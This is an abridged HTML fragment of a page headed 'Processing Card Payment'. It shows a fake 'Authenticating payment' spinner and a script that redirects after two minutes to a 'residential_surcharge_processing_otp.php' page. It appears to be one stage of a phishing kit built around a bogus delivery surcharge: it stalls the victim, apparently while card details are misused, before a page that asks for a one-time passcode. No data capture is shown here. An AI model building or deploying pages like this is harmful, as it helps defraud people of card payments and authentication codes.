        ...
        <div class="row">
            ...
            <div class="col-sm-6 pt-5" style="background-color:white;">
                    ...
                    <div class="card" style="background-color:white; height:420px">
                        ...
                        <p></p><h2>Processing Card Payment</h2><p></p>
...
<!--                    Marquee display                              -->
                                    ...
                                    <p>&nbsp;</p>
                                    <p>&nbsp;</p>
                            <table width="300" align="center" cellpadding="2" cellspacing="2" class="clsSelectedRowStyle">
                                <tbody>
                                    <tr>
                                        <td width="20"><font face="verdana" size="2"><!-- Demonstration -->
                                            <div align="center">
                                                <div id="fade_base">
                                                    <em><a id="fade_link" style="color: rgb(5, 5, 5);">Authenticating payment.....</a></em>
                                                </div>
                                            </div></font></td>
                                            <td width="2" valign="top"><img src="Img/loading.gif" alt="Animation"></td>
                                        </tr>
                                </tbody>
                            </table>
                        </center></div>
...
<script>// Delay the redirect to 'bb.blade.php' after 2 minutes (120000 milliseconds)
setTimeout(function() {
    window.location.href = "residential_surcharge_processing_otp.php";
}, 120000);
</script>
        </div></div></main>
    </div>
